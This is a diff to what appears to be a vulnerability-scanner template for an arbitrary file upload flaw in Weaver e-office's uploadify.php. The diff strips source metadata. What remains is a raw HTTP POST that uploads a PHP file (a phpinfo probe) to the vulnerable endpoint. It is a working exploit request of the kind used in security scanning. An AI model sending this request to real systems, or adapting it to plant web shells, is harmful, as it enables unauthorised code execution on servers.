@@ -3,20 +3,14 @@ info:
   name: 泛微OA e-office uploadify.php任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sz7df3fklcigweom'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sz7df3fklcigweom
-    fofa: 暂无
 http:
 - raw:
   - 'POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
 
 
     Content-Type: multipart/form-data; boundary=1
-
-
 
 
     --1
@@ -26,8 +20,6 @@ http:
 
 
     Content-Type: application/octet-stream
-
-
 
 
     <?php phpinfo();?>
